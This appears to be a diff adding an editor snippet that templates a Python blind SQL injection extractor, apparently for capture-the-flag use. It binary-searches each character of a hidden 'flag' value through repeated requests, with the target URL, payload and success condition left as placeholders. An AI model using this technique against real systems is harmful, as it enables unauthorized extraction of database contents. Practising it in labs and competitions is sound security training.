@@ -1,0 +1,24 @@
+snippet ch4ser_sqlbin "ch4ser_sqlbin" b
+import requests
+import time
+
+url = "$1"
+flag = ""
+index = 1
+
+while True:
+    u_bound = 255; l_bound=0;
+    while u_bound >= l_bound:
+        m_bound = (u_bound + l_bound) // 2
+        payload = "$2".format(index, m_bound)
+        res = requests.$3($4)
+	time.sleep($5)
+        if $6:
+            l_bound = m_bound + 1
+        else:
+            u_bound = m_bound - 1
+            tmp = m_bound
+    flag += chr(tmp)
+    print(flag)
+    index += 1
+endsnippet
